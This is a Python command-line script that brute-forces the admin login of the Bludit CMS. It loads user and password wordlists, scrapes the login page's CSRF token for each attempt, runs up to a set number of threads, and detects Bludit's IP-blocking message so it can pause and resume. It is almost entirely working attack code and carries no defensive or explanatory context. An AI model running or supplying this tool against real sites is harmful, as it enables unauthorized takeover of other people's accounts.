#!/usr/bin/env python3

import re
import requests
import json
import sys
import argparse
import threading
import time

class PasswordManager:
    def __init__(self,filepath):
        self.filepath = filepath

    def getNextPassword(self):
        return self.passwordlist.pop(0).strip("\n")
    
    def havePasswords(self):
        return len(self.passwordlist) > 0

    def reset(self):
        self.passwordlist = getWordList(self.filepath)

    def addPassword(self,password):
        self.passwordlist.append(password)

def getWordList(filepath):
    try:
        fh = open(filepath,"r")
        content = fh.readlines()
        fh.close()
        return content
    except Exception as e:
        print("Error reading file")
        print(str(e))
        exit(1)

def readArguments():
    usage_examples = sys.argv[0] + " --url http://bludit.sample.es/ -U /tmp/userlist.txt -W /tmp/passwordlist.txt \n"
    usage_examples += sys.argv[0] + " --url http://bludit.test.com/bludit/ -U /tmp/userlist.txt -W /tmp/passwordlist.txt -T 100\n"
    parser = argparse.ArgumentParser(epilog=usage_examples,formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--url",help="Specify the target_url", required=True)
    parser.add_argument("-U", help="Path to the userlist", required=True)
    parser.add_argument("-W", help="Path to passwordlist", required=True)
    parser.add_argument("-T", help="Maximum threads (default 20)", default=20)
    parser.add_argument("-wt", help="Time to wait before retrying bruteforce after you get blocked", default=120)
    args = parser.parse_args()
    return args

def getToken(targetUrl,session):
    response = session.get(targetUrl)
    match = re.search('<input.+id="jstokenCSRF".+(value=")(.+)(")>',response.text)
    return match.group(2)

def oneShot(targetUrl,user,password,token,session):
    payload = {"tokenCSRF":token,"username":user,"password":password,"save":""}
    response = session.post(targetUrl  ,data=payload)
    if response.url == "http://localhost:8080/admin/dashboard":
        print("User and password found")
        print("User: " + user)
        print("Password: " + password)
        exit(0)
    return response.text

def threadFunction(user,password,url,wt):
    global blocked
    session = requests.Session()
    token = getToken(url,session)
    response = oneShot(url,user,password,token,session)
    match = re.findall("IP address has been blocked<br>Try again in a few minutes",response)
    if match and blocked == False:
        blocked = True
        while match:
            print("Bludit is blocking requests, waiting " + str(wt) + " seconds before retrying")
            time.sleep(wt)
            session = requests.Session()
            token = getToken(url,session)
            response = oneShot(url,user,password,token,session)
            match = re.findall("IP address has been blocked<br>Try again in a few minutes",response)
        print("Bludit is no longerbloking, restarting the process")
        while threads:
            threads.pop(0)
        blocked = False
    elif blocked == True:
        PM.addPassword(password)

def main():
    global args
    global PM
    global blocked
    global threads

    blocked = False
    threads = []
    args = readArguments()
    userlist = getWordList(args.U)
    PM = PasswordManager(args.W)
    for user in userlist:
        threads = []
        PM.reset()
        while PM.havePasswords():
            if blocked == False:
                if len(threads) < args.T:
                    password = PM.getNextPassword()
                    threadArgs = (user,password,args.url,args.wt)
                    t = threading.Thread(target=threadFunction, args=threadArgs)
                    threads.append([t,threadArgs])
                    t.start()
                else:
                    i = 0
                    while i < args.T and blocked == False:
                        if not threads[i][0].is_alive():
                            threads.pop(i)
                            break
                        i = i + 1
            else:
                time.sleep(1)
    print("Attack completed, no password found")

if __name__ == '__main__':
    main()